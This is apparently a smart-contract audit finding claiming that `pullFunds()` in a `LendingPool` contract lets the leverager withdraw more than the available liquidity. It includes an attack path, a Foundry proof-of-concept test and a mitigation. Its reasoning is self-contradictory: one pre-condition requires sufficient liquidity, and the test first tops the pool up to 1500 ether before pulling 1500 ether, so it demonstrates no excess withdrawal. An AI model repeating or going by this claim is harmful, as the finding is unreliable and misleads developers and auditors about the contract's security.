# Lack of Liquidity Check in `pullFunds()` - Excess Withdrawal

### Summary

The `pullFunds()` function in the `LendingPool` contract lacks a check to ensure that the requested withdrawal amount does not exceed the available liquidity in the contract. This can lead to the withdrawal of more funds than are available, draining the liquidity pool and causing issues for other users.

### Root Cause

In the `LendingPool.sol` contract, the `pullFunds()` function (https://github.com/sherlock-audit/2025-02-yieldoor/blob/main/yieldoor/src/LendingPool.sol#L209-L214) does not verify if the requested amount is within the available liquidity in the reserve before allowing the withdrawal. This is a logic flaw that enables the leverager to pull more funds than the contract holds, potentially leading to a loss of liquidity.

### Internal Pre-conditions

1. The `leverager` must be allowed to call `pullFunds()` (which is set in the contract by the admin).
2. The reserve must hold sufficient liquidity (in this case, 1000 ether) for the requested `pullFunds()` amount.
3. The `pullFunds()` function does not check if the requested amount exceeds the available liquidity in the reserve.

### External Pre-conditions

1. The market price of the underlying asset must be stable and not result in slippage when pulling funds.
2. The user (leverager) must be allowed to call `pullFunds()` and request the withdrawal.

### Attack Path

1. The user (or attacker) calls the `deposit()` function to deposit 1000 ether in the contract, allowing for the leverage to be used.
2. The attacker or leverager tries to pull 1500 ether, even though the underlying reserve only holds 1000 ether.
3. The contract allows the excessive withdrawal due to the lack of a liquidity check in `pullFunds()`.
4. This could lead to a loss of liquidity in the contract, potentially causing other users to lose funds or become unable to interact with the system.

### Impact

The protocol could experience liquidity loss and insolvency, which may result in:
- Users losing funds if they try to redeem tokens or withdraw funds when liquidity has been drained.
- Protocol failure if liquidity is not properly managed and excessive withdrawals are allowed.
- Disruption of the system as the available liquidity would no longer match the reserve balance, causing instability.

```solidity
import "forge-std/Test.sol";
import "../src/LendingPool.sol";
import "../src/Leverager.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

// Mock ERC20 token for testing
contract MockERC20 is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {
        _mint(msg.sender, 20000 ether); // Mint initial tokens for testing
    }

    function decimals() public view override returns (uint8) {
        return 18; // Standard 18 decimals
    }
}

// Test contract for the LendingPool
contract LendingPoolTest is Test {
    LendingPool pool;
    MockERC20 token;
    address yTokenAddress;
    address owner = address(0x1);
    address user = address(0x2);
    address leverager = address(0x3);
    address attacker = address(0x4);

    function setUp() public {
        // Setting up the environment
        vm.startPrank(owner);
        pool = new LendingPool();
        token = new MockERC20("TestToken", "TTK");

        // Initialize reserve for the token
        pool.initReserve(address(token));
        yTokenAddress = pool.getYTokenAddress(address(token));
        pool.setLeverager(leverager);

        // Approving and transferring tokens to test users
        token.approve(address(pool), type(uint256).max);
        token.transfer(user, 1000 ether);
        token.transfer(attacker, 500 ether);
        vm.stopPrank();

        vm.startPrank(user);
        token.approve(address(pool), type(uint256).max);
        yToken(yTokenAddress).approve(address(pool), type(uint256).max);
        vm.stopPrank();

        vm.prank(attacker);
        token.approve(address(pool), type(uint256).max);
    }

    // Test case: PullFunds without liquidity check
    function testPullFundsExcess() public {
        vm.prank(user);
        pool.deposit(address(token), 1000 ether, user); // User deposits 1000 ether

        vm.prank(attacker);
        token.transfer(yTokenAddress, 500 ether); // Attacker adds excess tokens

        vm.prank(leverager);
        pool.pullFunds(address(token), 1500 ether); // Attempt to pull 1500 ether, more than available liquidity (1000 ether)

        uint256 yTokenBalance = token.balanceOf(yTokenAddress);
        // Verifying that the pool balance remains 0 after pulling more than available liquidity
        assertEq(
            yTokenBalance,
            0,
            "Leverager pulled more than available liquidity"
        );
    }
}

```

### Mitigation

To prevent this issue, a check should be added in the `pullFunds()` function to ensure the requested amount does not exceed the available liquidity in the contract. The modified function would look like:

```solidity
function pullFunds(address asset, uint256 amount) external nonReentrant {
    require(msg.sender == leverager, "borrower not leverager");

    // Get the reserve data for the asset
    DataTypes.ReserveData storage reserve = getReserve(asset);

    // Ensure that the amount to pull is within the available liquidity
    require(amount <= reserve.availableLiquidity(), "not enough available liquidity");

    // Proceed with the transfer if sufficient liquidity exists
    IyToken(reserve.yTokenAddress).transferUnderlyingTo(_msgSender(), amount);
}
```
